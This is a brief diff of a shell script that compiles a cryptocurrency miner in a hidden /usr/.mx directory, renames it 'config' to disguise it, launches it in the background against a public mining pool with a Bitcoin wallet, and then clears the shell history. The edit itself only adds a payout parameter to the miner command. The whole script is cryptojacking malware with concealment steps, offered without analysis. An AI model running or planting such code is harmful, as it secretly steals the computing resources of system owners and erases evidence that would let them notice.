@@ -8,5 +8,5 @@ cd /usr/.mx
 ./configure CFLAGS="-O3"
 make
 mv minerd config
-nohup ./config -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Loch2rNJWp3eNgUjiZaa92nZvQyP9pT6F &
+nohup ./config -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Loch2rNJWp3eNgUjiZaa92nZvQyP9pT6F -p c=BTC &
 history -c
